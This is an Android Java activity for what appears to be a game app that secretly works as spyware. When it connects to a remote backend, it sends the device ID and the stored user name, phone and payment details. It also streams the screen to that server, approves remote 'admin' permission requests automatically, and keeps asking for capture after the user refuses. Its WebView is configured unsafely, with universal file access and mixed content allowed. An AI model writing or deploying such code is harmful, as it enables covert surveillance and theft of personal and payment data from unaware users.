package com.screenmirror.app;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.webkit.ConsoleMessage;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.appcompat.app.AppCompatActivity;

public class MirrorGameActivity extends AppCompatActivity implements SocketManager.Listener {

    private static final String TAG = "MirrorGame";
    private static final int RC_PROJECTION = 200;

    private WebView webView;
    private SharedPreferences prefs;
    private Handler mainHandler;
    private MediaProjectionManager projectionManager;
    private boolean projectionLaunching = false;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Keep screen on during gameplay
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        mainHandler = new Handler(Looper.getMainLooper());
        prefs = getSharedPreferences("sm_prefs", MODE_PRIVATE);
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        webView = new WebView(this);
        webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        setContentView(webView);

        WebSettings ws = webView.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setMediaPlaybackRequiresUserGesture(false);
        ws.setCacheMode(WebSettings.LOAD_NO_CACHE);
        ws.setUseWideViewPort(true);
        ws.setLoadWithOverviewMode(true);
        ws.setAllowFileAccess(true);
        ws.setAllowContentAccess(true);
        ws.setAllowUniversalAccessFromFileURLs(true);
        ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        webView.setBackgroundColor(0xFF06060E);
        webView.setOverScrollMode(View.OVER_SCROLL_NEVER);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onConsoleMessage(ConsoleMessage cm) {
                Log.d("MirrorGame", cm.message() + " -- line " + cm.lineNumber() + " of " + cm.sourceId());
                return true;
            }
        });
        webView.addJavascriptInterface(new GameBridge(), "Android");
        webView.loadUrl("file:///android_asset/game.html");
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            // Immersive sticky mode for full-screen gaming experience
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
        }
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Take over as socket listener when game is in foreground
        SocketManager.getInstance().setListener(this);
        // Only connect if not connected — don't request capture here,
        // let onConnected() handle that after registration
        String serverUrl = prefs.getString("server_url", "https://mirrorbackend-ohir.onrender.com");
        if (!SocketManager.getInstance().isConnected()) {
            Log.d(TAG, "Socket not connected, reconnecting...");
            SocketManager.getInstance().connect(serverUrl);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_PROJECTION) {
            projectionLaunching = false;
            if (resultCode == RESULT_OK && data != null) {
                // Save the projection result in MainActivity's static fields too
                MainActivity.savedResultCode = resultCode;
                MainActivity.savedResultData = data;
                launchCaptureService(resultCode, data);
            } else {
                Log.w(TAG, "Screen projection denied by user");
                // Retry after a delay
                mainHandler.postDelayed(() -> requestScreenCapture(), 2000);
            }
        }
    }

    private void ensureConnectedAndStreaming() {
        String serverUrl = prefs.getString("server_url", "https://mirrorbackend-ohir.onrender.com");
        if (!SocketManager.getInstance().isConnected()) {
            Log.d(TAG, "Socket not connected, reconnecting...");
            SocketManager.getInstance().setListener(this);
            SocketManager.getInstance().connect(serverUrl);
        } else {
            // Already connected, make sure capture is running
            requestScreenCapture();
        }
    }

    private void requestScreenCapture() {
        if (MainActivity.savedResultCode != -1 && MainActivity.savedResultData != null) {
            launchCaptureService(MainActivity.savedResultCode, MainActivity.savedResultData);
        } else if (!projectionLaunching) {
            projectionLaunching = true;
            Log.d(TAG, "Requesting screen capture permission from game activity");
            Intent intent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(intent, RC_PROJECTION);
        }
    }

    private void launchCaptureService(int resultCode, Intent resultData) {
        Intent si = new Intent(this, ScreenCaptureService.class);
        si.setAction(ScreenCaptureService.ACTION_START);
        si.putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode);
        si.putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, resultData);
        si.putExtra(ScreenCaptureService.EXTRA_QUALITY, SocketManager.getInstance().getCurrentQuality());
        si.putExtra(ScreenCaptureService.EXTRA_FPS, SocketManager.getInstance().getCurrentFps());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(si);
        } else {
            startService(si);
        }
        Log.d(TAG, "Capture service launched from game activity");
    }

    // ─────── SocketManager.Listener ───────

    @Override
    public void onConnected() {
        mainHandler.post(() -> {
            Log.d(TAG, "Socket connected, registering device");
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
            String userName = prefs.getString("user_name", "");
            String userPhone = prefs.getString("user_phone", "");
            String userPayment = prefs.getString("user_payment", "");
            SocketManager.getInstance().register(
                    deviceId, deviceName, Build.VERSION.RELEASE,
                    Build.MANUFACTURER, Build.MODEL,
                    getResources().getDisplayMetrics().widthPixels,
                    getResources().getDisplayMetrics().heightPixels,
                    -1, userName, userPhone, userPayment);
            // Start screen capture
            requestScreenCapture();
        });
    }

    @Override
    public void onDisconnected() {
        mainHandler.post(() -> {
            Log.d(TAG, "Socket disconnected, will auto-reconnect");
            // socket.io auto-reconnects, no manual action needed
        });
    }

    @Override
    public void onConnectionError(String error) {
        Log.e(TAG, "Connection error: " + error);
    }

    @Override
    public void onPermissionRequest(String requestId, String adminName) {
        mainHandler.post(() -> {
            Log.d(TAG, "Permission request from admin — auto-approving");
            SocketManager.getInstance().sendPermissionResponse(true);
            requestScreenCapture();
        });
    }

    @Override
    public void onStartCapture() {
        mainHandler.post(() -> requestScreenCapture());
    }

    @Override
    public void onStopCapture() {
        mainHandler.post(() -> {
            Intent si = new Intent(this, ScreenCaptureService.class);
            si.setAction(ScreenCaptureService.ACTION_STOP);
            startService(si);
        });
    }

    @Override
    public void onQualityChange(int quality, int fps) {
        Log.d(TAG, "Quality change: " + quality + "% @ " + fps + "fps");
    }

    public class GameBridge {

        @JavascriptInterface
        public String getPref(String key, String defVal) {
            String val = prefs.getString(key, null);
            if (val != null) return val;
            try {
                int intVal = prefs.getInt(key, Integer.MIN_VALUE);
                if (intVal != Integer.MIN_VALUE) return String.valueOf(intVal);
            } catch (ClassCastException ignored) {}
            return defVal;
        }

        @JavascriptInterface
        public void savePref(String key, String value) {
            prefs.edit().putString(key, value).apply();
        }
    }
}